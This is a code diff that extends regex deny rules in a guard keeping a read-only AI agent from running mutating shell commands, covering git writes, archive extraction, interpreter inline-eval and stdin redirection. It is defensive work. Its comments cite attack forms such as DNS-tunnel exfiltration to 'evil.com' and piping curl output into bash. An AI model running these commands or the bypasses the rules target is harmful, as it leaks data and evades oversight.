@@ -61,6 +61,14 @@ _CMD = r"(?:^|[|;&]\s*)" + _WRAP
 # parse shell quoting, and that residual errs toward deny, matching the guard's posture.
 _CMD_SUB = r"(?:^|[|;&(){}`]\s*)" + _WRAP
 
+# Command-position anchor for INTERPRETERS. Like _CMD_SUB but also tolerates a leading `VAR=val`
+# assignment run (`FOO=bar python3 -c …`) and an absolute/relative path to the binary
+# (`/usr/bin/python3 -c …`). Requiring command position is what keeps a `.py`/`.sh` FILENAME in
+# argument position (`… app.py | grep -e def`, `cat deploy.sh | grep -c x`) from colliding with the
+# two-letter `py`/`sh` interpreter tokens — the whole false-positive class the bare `\b(py|sh)\b`
+# form produced.
+_INTERP = _CMD_SUB + r"(?:\w+=(?:\"[^\"]*\"|'[^']*'|\S+)\s+)*(?:\S*/)?"
+
 # Git accepts GLOBAL options BETWEEN `git` and the subcommand (`git -C <path> push`, `git -c k=v commit`,
 # `git --git-dir=… --work-tree=… add`, `git --no-pager reset`). Without tolerating that prefix, the verb
 # anchor `\bgit\s+(push|commit|…)` is bypassed by the idiomatic, non-adversarial `git -C repo …` form.
@@ -104,9 +112,21 @@ _DENY_PATTERNS = [
     # position (no false positive when a git verb is only grep'd/echoed text); _GIT_PRE tolerates
     # git's global-option prefix so it can't bypass the verb anchor.
     _GIT_CMD + _GIT_PRE + r"(add|mv|rm|push|commit|reset|rebase|merge|cherry-pick|revert|clean|am|apply|"
-    r"restore|checkout|switch|pull|stash|gc|prune|init|worktree|update-ref|update-index|"
-    r"symbolic-ref|filter-branch|branch\s+-[dDmM]|tag\s+-d|"
-    r"remote\s+(add|rm|remove|set-url))\b",
+    r"restore|checkout|switch|pull|fetch|gc|prune|init|update-ref|update-index|"
+    r"symbolic-ref|filter-branch|format-patch|bundle|archive|send-email|replace|"
+    r"stash\b(?!\s+(?:list|show)\b)|worktree\b(?!\s+list\b)|"
+    r"notes\s+(?:--ref(?:=\S+|\s+\S+)\s+)?(?:add|append|copy|edit|remove|prune)|"
+    r"remote\s+(?:add|rm|remove|set-url))\b",
+    # `git branch`/`git tag` WRITE forms. A leading read selector (`-r`, `-a`, `-l`) must NOT exempt a
+    # later mutating flag, so deny when a delete/rename/copy/force/create flag appears ANYWHERE, or when
+    # the first token is a bare name (lightweight create). Pure listing/verify commands carry none of
+    # these, so `git branch -a`, `git branch -r --contains X`, `git tag -l 'v*'`, `git tag -v x` pass.
+    _GIT_CMD + _GIT_PRE + r"branch\b[^|;&]*\s(?:-[dDmMcCf]|"
+    r"--(?:delete|move|copy|force|set-upstream-to|unset-upstream|track|no-track|edit-description)\b)",
+    _GIT_CMD + _GIT_PRE + r"branch\s+(?!-)\S",
+    _GIT_CMD + _GIT_PRE + r"tag\b[^|;&]*\s(?:-[adsfFmu]|"
+    r"--(?:delete|annotate|sign|local-user|force|create-reflog)\b)",
+    _GIT_CMD + _GIT_PRE + r"tag\s+(?!-)\S",
     # git config WRITE: a dotted key followed by a value, or an explicit write flag.
     # Reads (`--get`/`--list`) lack the trailing value, so they pass through.
     _GIT_CMD + _GIT_PRE + r"config\s+(?:--\S+\s+)*\S+\.\S+\s+\S",
@@ -120,6 +140,25 @@ _DENY_PATTERNS = [
     # past the command-position anchor above, since rm sits in argument position there).
     r"\bfind\b[^|;&]*\s-delete\b",
     r"\bfind\b[^|;&]*\s-(exec|execdir|ok|okdir)\b",
+    # Archive extractors / patch appliers WRITE files, exactly like cp/mv above. Command-position
+    # anchored so the verb as search text (`rg "tar xf" docs/`) is not a false positive, with the
+    # obvious read-only sub-forms exempted: `patch --dry-run`, `tar t…`/list, `unzip -l/-t`,
+    # `gunzip -c/-l/-t`. `tar` fires only when the mode token carries an extract/create flag.
+    _CMD_SUB + r"(?:\S*/)?patch\b(?![^|;&]*--dry-run)",
+    # tar writes in extract (x) or create (c) mode; the mode may be the classic first-token flag
+    # cluster (`tar xzf`, `tar -xzf`, `tar czf`) OR a `-x`/`-c` flag AFTER other options
+    # (`tar -C /tmp -xf …`, `tar --directory=/tmp -xf …`), OR a long-form mode word. List/verify
+    # modes (`tar tf`, `tar --list`) carry no x/c in an option token and stay allowed.
+    _CMD_SUB + r"(?:\S*/)?tar\b(?:"
+    r"\s+-?[A-Za-z]*[xc]"
+    r"|[^|;&]*?\s-[A-Za-z]*[xc]"
+    r"|[^|;&]*?\s--(?:extract|create|append|update|delete)\b"
+    r")",
+    # unzip / gunzip / gzip WRITE by default; exempt the non-extracting read modes. The read flag
+    # may sit inside a COMBINED short-option cluster (`unzip -lq`, `gunzip -ck`), so match the letter
+    # anywhere in the cluster rather than requiring it to stand alone.
+    _CMD_SUB + r"(?:\S*/)?unzip\b(?![^|;&]*\s-[A-Za-z]*[lt])",
+    _CMD_SUB + r"(?:\S*/)?(?:gunzip|gzip)\b(?![^|;&]*\s-[A-Za-z]*[clt])",
     # GNU install copies/creates files; anchored to command position because 'install'
     # is also a common path component (e.g. `ls /opt/install`) and a package subcommand.
     _CMD + r"install\b",
@@ -175,14 +214,22 @@ _DENY_PATTERNS = [
     # DNS-tunnel exfil — dig/nslookup/host carrying substitution (`dig $(whoami).evil.com`).
     # Command-position anchored; plain lookups (`dig example.com`) still pass.
     _CMD + r"(dig|nslookup|host)\b[^|;&]*(\$\(|`|<\()",
-    # Nested shells/interpreters are too easy to use as mutation bypasses.
+    # Nested shells/interpreters are too easy to use as mutation bypasses. All anchored to command
+    # position via _INTERP and bounded to a single segment ([^|;&]*) so a downstream `| grep -e x`
+    # or a `.py`/`.sh` FILENAME argument is not mistaken for an inline-eval flag.
     # Shell interpreters: -c / /c / -Command run an inline command string.
-    r"\b(bash|sh|zsh|pwsh|powershell|cmd)\b.*\s(-c|/c|-Command|-File)\b",
+    _INTERP + r"(bash|sh|zsh|pwsh|powershell|cmd)\b[^|;&]*\s(-c|/c|-Command|-File)\b",
     # Code interpreters: -c/-e/-E/-p/--eval/--print eval inline code — perl/ruby/node -e
     # are exact peers of python -c. A bare trailing `-` or a heredoc feeds a script on stdin.
-    r"\b(python|python3|py|perl|ruby|node)\b.*\s(-c|-e|-E|-p|--eval|--print)\b",
-    r"\b(python|python3|py|perl|ruby|node|bash|sh|zsh|pwsh|powershell)\s+-(\s|$)",
-    r"\b(python|python3|py|perl|ruby|node|bash|sh|zsh|pwsh|powershell)\b[^|;&]*<<-?\s*[\"']?\w",
+    _INTERP + r"(python|python3|py|perl|ruby|node)\b[^|;&]*\s(-c|-e|-E|-p|--eval|--print)\b",
+    _INTERP + r"(python|python3|py|perl|ruby|node|bash|sh|zsh|pwsh|powershell)\s+-(\s|$)",
+    _INTERP + r"(python|python3|py|perl|ruby|node|bash|sh|zsh|pwsh|powershell)\b[^|;&]*<<-?\s*[\"']?\w",
+    # An interpreter reading its script from STDIN redirection (`bash < deploy.sh`,
+    # `python3 < mutate.py`, `sh -s < run.sh`) — this runs the file just like `bash deploy.sh` and
+    # rides in even after a pipe (`curl … | bash < payload`). `<(?!<)` excludes the heredoc `<<`
+    # (handled above); reading from /dev/null is a harmless no-op and stays allowed.
+    _INTERP + r"(bash|sh|zsh|pwsh|powershell|cmd|python|python3|py|perl|ruby|node)\b[^|;&]*"
+    r"<(?!<)\s*(?!/dev/null\b)[\"'./~$A-Za-z0-9_-]",
     # --- running local SCRIPTS / build & orchestration verbs --------------------------------
     # A read-only agent has no business executing arbitrary local scripts or kicking off
     # build/deploy/orchestration runners — these are open-ended state changes. Conservative on
